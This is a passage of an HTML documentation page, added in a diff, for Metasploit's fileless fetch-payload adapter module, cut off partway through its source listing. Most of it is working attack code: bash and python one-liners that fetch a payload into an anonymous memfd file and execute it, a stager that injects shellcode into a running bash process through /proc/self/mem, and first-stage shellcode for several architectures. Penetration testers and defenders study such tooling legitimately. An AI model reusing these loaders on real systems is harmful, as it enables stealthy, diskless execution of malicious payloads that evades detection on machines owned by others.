@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Adapter::Fetch::Fileless
+  
+    &mdash; Documentation by YARD 0.9.37
+  
+</title>
+
+  <link rel="stylesheet" href="../../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Adapter::Fetch::Fileless";
+  relpath = '../../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../../_index.html">Index (F)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Adapter.html" title="Msf::Payload::Adapter (module)">Adapter</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Fetch.html" title="Msf::Payload::Adapter::Fetch (module)">Fetch</a></span></span>
+     &raquo; 
+    <span class="title">Fileless</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Adapter::Fetch::Fileless
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  
+
+  
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="../Fetch.html" title="Msf::Payload::Adapter::Fetch (module)">Msf::Payload::Adapter::Fetch</a></span></dd>
+  </dl>
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/adapter/fetch/fileless.rb</dd>
+  </dl>
+  
+</div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_fileless_bash_search-instance_method" title="#_generate_fileless_bash_search (instance method)">#<strong>_generate_fileless_bash_search</strong>(get_file_cmd)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>The idea behind fileless execution are anonymous files.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_fileless_python-instance_method" title="#_generate_fileless_python (instance method)">#<strong>_generate_fileless_python</strong>(get_file_cmd)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>same idea as _generate_fileless function, but force creating anonymous file handle.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_fileless_shell-instance_method" title="#_generate_fileless_shell (instance method)">#<strong>_generate_fileless_shell</strong>(get_file_cmd, arch)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Original Idea: The idea behind fileless execution are anonymous files.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_first_stage_shellcode-instance_method" title="#_generate_first_stage_shellcode (instance method)">#<strong>_generate_first_stage_shellcode</strong>(arch)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_jmp_instruction-instance_method" title="#_generate_jmp_instruction (instance method)">#<strong>_generate_jmp_instruction</strong>(arch)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="_generate_fileless_bash_search-instance_method">
+  
+    #<strong>_generate_fileless_bash_search</strong>(get_file_cmd)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains “memfd”) with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/fileless.rb', line 253</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_fileless_bash_search'>_generate_fileless_bash_search</span><span class='lparen'>(</span><span class='id identifier rubyid_get_file_cmd'>get_file_cmd</span><span class='rparen'>)</span>
+  <span class='comment'># get list of all $USER&#39;s processes
+</span>  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FOUND=0</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>;for i in $(ps -u $USER | awk &#39;{print $1}&#39;)</span><span class='tstring_end'>&quot;</span></span>
+  <span class='comment'># already found anonymous file where we can write
+</span>  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; do if [ $FOUND -eq 0 ]</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='comment'># look for every symbolic link with write rwx permissions
+</span>  <span class='comment'># if found one, try to download payload into the anonymous file
+</span>  <span class='comment'># and execute it
+</span>  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2&gt;/dev/null)</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; do if [ $(ls -al $f | grep -o &quot;memfd&quot; &gt;/dev/null; echo $?) -eq &quot;0&quot; ]</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>; then if $(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_file_cmd'>get_file_cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'> &gt;/dev/null)</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; then $f</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; FOUND=1</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; break</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; fi</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; fi</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; done</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; fi</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>; done</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='id identifier rubyid_cmd'>cmd</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="_generate_fileless_python-instance_method">
+  
+    #<strong>_generate_fileless_python</strong>(get_file_cmd)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>same idea as _generate_fileless function, but force creating anonymous file handle</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+248
+249
+250</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/fileless.rb', line 248</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_fileless_python'>_generate_fileless_python</span><span class='lparen'>(</span><span class='id identifier rubyid_get_file_cmd'>get_file_cmd</span><span class='rparen'>)</span>
+  <span class='tstring'><span class='tstring_beg'>%Q&lt;</span><span class='tstring_content'>python3 -c &#39;import os;fd=os.memfd_create(&quot;&quot;,os.MFD_CLOEXEC);os.system(f&quot;f=\\&quot;/proc/{os.getpid()}/fd/{fd}\\&quot;;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_file_cmd'>get_file_cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>;$f&amp;&quot;)&#39;</span><span class='tstring_end'>&gt;</span></span> 
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="_generate_fileless_shell-instance_method">
+  
+    #<strong>_generate_fileless_shell</strong>(get_file_cmd, arch)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains “memfd”) with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/fileless.rb', line 214</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_fileless_shell'>_generate_fileless_shell</span><span class='lparen'>(</span><span class='id identifier rubyid_get_file_cmd'>get_file_cmd</span><span class='comma'>,</span> <span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%&lt;</span><span class='tstring_content'>writebytes () { printf \\\\%03o &quot;$@&quot; ; };</span><span class='tstring_end'>&gt;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%&lt;</span><span class='tstring_content'>vdso_addr=$((0x$(grep -F &quot;[vdso]&quot; /proc/$$/maps | cut -d&#39;-&#39; -f1)));</span><span class='tstring_end'>&gt;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%(</span><span class='tstring_content'>jmp=</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__generate_jmp_instruction'>_generate_jmp_instruction</span><span class='lparen'>(</span><span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>;</span><span class='tstring_end'>)</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%(</span><span class='tstring_content'>sc=&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__generate_first_stage_shellcode'>_generate_first_stage_shellcode</span><span class='lparen'>(</span><span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>H*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;;</span><span class='tstring_end'>)</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>read syscall_info &lt; /proc/self/syscall;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>addr=$(($(echo $syscall_info | cut -d&#39; &#39; -f9)));</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>exec 3&gt;/proc/self/mem;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>dd bs=1 skip=$vdso_addr &lt;&amp;3 &gt;/dev/null 2&gt;&amp;1;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%(</span><span class='tstring_content'>printf &quot;$(writebytes `printf $sc | sed &#39;s/.\\{2\\}/0x&amp; /g&#39;`)&quot; &gt;&amp;3;</span><span class='tstring_end'>)</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>exec 3&gt;&amp;-;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>exec 3&gt;/proc/self/mem;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>dd bs=1 skip=$addr &lt;&amp;3 &gt;/dev/null 2&gt;&amp;1;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_stage_cmd'>stage_cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%(</span><span class='tstring_content'>printf &quot;$(writebytes `printf $jmp | sed &#39;s/.\\{2\\}/0x&amp; /g&#39;`)&quot; &gt;&amp;3;</span><span class='tstring_end'>)</span></span>
+
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>echo -n &#39;</span><span class='embexpr_beg'>#{</span><span class='const'>Base64</span><span class='period'>.</span><span class='id identifier rubyid_strict_encode64'>strict_encode64</span><span class='lparen'>(</span><span class='id identifier rubyid_stage_cmd'>stage_cmd</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>\n</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39; | base64 -d | ${SHELL} &amp; </span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>cd /proc/$!;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>og_process=$!;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>sleep 2;</span><span class='tstring_end'>&#39;</span></span> <span class='comment'>#adding short pause to give process time to load file handle
+</span>  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FOUND=0;if [ $FOUND -eq 0 ];</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>then for f in $(find ./fd -type l -perm u=rwx 2&gt;/dev/null);</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>do if [ $(ls -al $f | grep -o &quot;memfd&quot; &gt;/dev/null; echo $?) -eq &quot;0&quot; ];</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>then if $(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_file_cmd'>get_file_cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'> &gt;/dev/null);</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>then $f &amp; FOUND=1;break;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>fi;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>fi;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>done;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>fi;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>sleep 2;</span><span class='tstring_end'>&#39;</span></span> <span class='comment'>#adding short pause to give process time to load file handle
+</span>  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kill -9 $og_process;</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="_generate_first_stage_shellcode-instance_method">
+  
+    #<strong>_generate_first_stage_shellcode</strong>(arch)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/fileless.rb', line 3</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_first_stage_shellcode'>_generate_first_stage_shellcode</span><span class='lparen'>(</span><span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span>
+  <span class='kw'>case</span> <span class='id identifier rubyid_arch'>arch</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x64</span><span class='tstring_end'>&#39;</span></span>
+    <span class='comment'># fd = memfd_create()
+</span>    <span class='comment'># ftruncate(fd, null)
+</span>    <span class='comment'># pause()
+</span>    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%(</span><span class='tstring_content'>
+    start:
+        xor rsi, rsi
+        push rsi
+        push rsp
+        pop rdi
+        mov rax, 0xfffffffffffffec1 
+        neg rax
+        syscall
+        mov rdi,rax
+        mov al, 0x4d
+        syscall
+        push 0x22
+        pop rax
+        syscall
+
+    </span><span class='tstring_end'>)</span></span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span>
+    <span class='comment'># fd = memfd_create()
+</span>    <span class='comment'># ftruncate(fd, null)
+</span>    <span class='comment'># pause()
+</span>    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%(</span><span class='tstring_content'>
+      xor ecx, ecx
+      push ecx
+      lea ebx, [esp]
+      inc ecx
+      mov eax, 0xfffffe9c
+      neg eax
+      int 0x80
+      mov ebx, eax
+      mov al, 0x5d
+      int 0x80
+      mov al, 0x1d
+      int 0x80
+    </span><span class='tstring_end'>)</span></span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X86</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>aarch64</span><span class='tstring_end'>&#39;</span></span>
+    <span class='comment'># fd = memfd_create()
+</span>    <span class='comment'># ftruncate(fd, null)
+</span>    <span class='comment'># pid = getpid()
+</span>    <span class='comment'># kill(pid,SIGSTOP)
+</span>    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+        <span class='int'>0x000080d2</span><span class='comma'>,</span> <span class='comment'>#0x1000:	mov	x0, #0	0x000080d2
+</span>        <span class='int'>0xe00f1ff8</span><span class='comma'>,</span> <span class='comment'>#0x1004:	str	x0, [sp, #-0x10]!	0xe00f1ff8
+</span>        <span class='int'>0xe0030091</span><span class='comma'>,</span> <span class='comment'>#0x1008:	mov	x0, sp	0xe0030091
+</span>        <span class='int'>0x210001ca</span><span class='comma'>,</span> <span class='comment'>#0x100c:	eor	x1, x1, x1	0x210001ca
+</span>        <span class='int'>0xe82280d2</span><span class='comma'>,</span> <span class='comment'>#0x1010:	mov	x8, #0x117	0xe82280d2
+</span>        <span class='int'>0x010000d4</span><span class='comma'>,</span> <span class='comment'>#0x1014:	svc	#0	0x010000d4
+</span>        <span class='int'>0xc80580d2</span><span class='comma'>,</span> <span class='comment'>#0x1018:	mov	x8, #0x2e	0xc80580d2
+</span>        <span class='int'>0x010000d4</span><span class='comma'>,</span> <span class='comment'>#0x101c:	svc	#0	0x010000d4
+</span>        <span class='int'>0x881580d2</span><span class='comma'>,</span> <span class='comment'>#0x1020:	mov	x8, #0xac	0x881580d2
+</span>        <span class='int'>0x010000d4</span><span class='comma'>,</span> <span class='comment'>#0x1024:	svc	#0	0x010000d4
+</span>        <span class='int'>0x610280d2</span><span class='comma'>,</span> <span class='comment'>#0x1028:	mov	x1, #0x13	0x610280d2
+</span>        <span class='int'>0x281080d2</span><span class='comma'>,</span> <span class='comment'>#0x102c:	mov	x8, #0x81	0x281080d2
+</span>        <span class='int'>0x010000d4</span><span class='comma'>,</span> <span class='comment'>#0x1030:	svc	#0	0x010000d4
+</span>
+    <span class='rbracket'>]</span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>N*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>armle</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+      <span class='int'>0xe3b02000</span><span class='comma'>,</span> <span class='comment'>#0x1000:	movs	r2, #0	0xe3b02000
+</span>      <span class='int'>0xe52d2004</span><span class='comma'>,</span> <span class='comment'>#0x1004:	str	r2, [sp, #-4]!	0xe52d2004
+</span>      <span class='int'>0xe1a0000d</span><span class='comma'>,</span> <span class='comment'>#0x1008:	mov	r0, sp	0xe1a0000d
+</span>      <span class='int'>0xe3a01001</span><span class='comma'>,</span> <span class='comment'>#0x100c:	mov	r1, #1	0xe3a01001
+</span>      <span class='int'>0xe3a07083</span><span class='comma'>,</span> <span class='comment'>#0x1010:	mov	r7, #0x83	0xe3a07083
+</span>      <span class='int'>0xe28770fe</span><span class='comma'>,</span> <span class='comment'>#0x1014:	add	r7, r7, #0xfe	0xe28770fe
+</span>      <span class='int'>0xef000000</span><span class='comma'>,</span> <span class='comment'>#0x1018:	svc	#0	0xef000000
+</span>      <span class='int'>0xe3a0705d</span><span class='comma'>,</span> <span class='comment'>#0x101c:	mov	r7, #0x5d	0xe3a0705d
+</span>      <span class='int'>0xef000000</span><span class='comma'>,</span> <span class='comment'>#0x1020:	svc	#0	0xef000000
